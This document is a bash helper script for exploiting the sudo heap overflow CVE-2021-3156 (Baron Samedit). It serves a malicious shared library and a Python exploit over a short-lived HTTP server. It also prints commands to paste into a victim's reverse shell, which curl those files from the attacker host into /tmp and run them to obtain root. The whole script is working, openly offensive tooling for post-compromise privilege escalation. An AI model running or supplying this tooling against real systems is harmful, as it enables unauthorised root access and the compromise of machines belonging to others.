#!/bin/bash
# Baron Samedit (CVE-2021-3156) privilege escalation — transfer + run helper
#
# Run this ON THE ATTACKER. It starts a short-lived HTTP server hosting the
# pre-built payload .so and the Python exploit, then emits a tiny shell
# block you paste into an existing reverse shell on the victim. The victim
# curls the files down and runs the exploit.
#
# Why HTTP instead of base64-paste: reverse shells (no TTY) mangle long
# pasted base64 blobs — single quotes get dropped, line wrapping corrupts
# the payload. curl is reliable.
#
# Why pre-built .so: the victim has no gcc.

set -e

EXPLOIT_DIR="/opt/exploits/baron-samedit"
LIB_SRC="$EXPLOIT_DIR/payload_lib.so"
PY_SRC="$EXPLOIT_DIR/exploit_nss.py"
LHOST="${1:-172.26.0.10}"
HTTP_PORT="${2:-8889}"
REMOTE_LIB="/tmp/libnss_X/P0P_SH3LL.so.2"
REMOTE_PY="/tmp/exploit_nss.py"

if [ ! -f "$LIB_SRC" ] || [ ! -f "$PY_SRC" ]; then
    echo "[!] Missing exploit files. Build with: cd $EXPLOIT_DIR && make"
    exit 1
fi

# Kill any old instance bound to HTTP_PORT, then serve live files from the
# exploit directory so edits to exploit_nss.py take effect on the next curl
# (no stage directory — it would freeze the served content at server start).
pkill -f "http.server $HTTP_PORT" 2>/dev/null || true
(cd "$EXPLOIT_DIR" && python3 -m http.server "$HTTP_PORT" >/dev/null 2>&1) &
HTTP_PID=$!
sleep 1

cat <<EOF

════════════════════════════════════════════════════════════════════
 Baron Samedit (CVE-2021-3156) — Paste into the victim reverse shell
════════════════════════════════════════════════════════════════════

mkdir -p "\$(dirname ${REMOTE_LIB})"
curl -s -o ${REMOTE_LIB} http://${LHOST}:${HTTP_PORT}/payload_lib.so
curl -s -o ${REMOTE_PY}  http://${LHOST}:${HTTP_PORT}/exploit_nss.py
chmod +x ${REMOTE_PY}
python3 ${REMOTE_PY}

════════════════════════════════════════════════════════════════════

If the exploit succeeds, the victim shell prints:
  [+] ROOT shell obtained!
and the prompt becomes '#' (root).

Press Ctrl+C here to stop the HTTP server when done (PID ${HTTP_PID}).
EOF

trap "kill $HTTP_PID 2>/dev/null; echo '[*] HTTP server stopped'" EXIT
wait
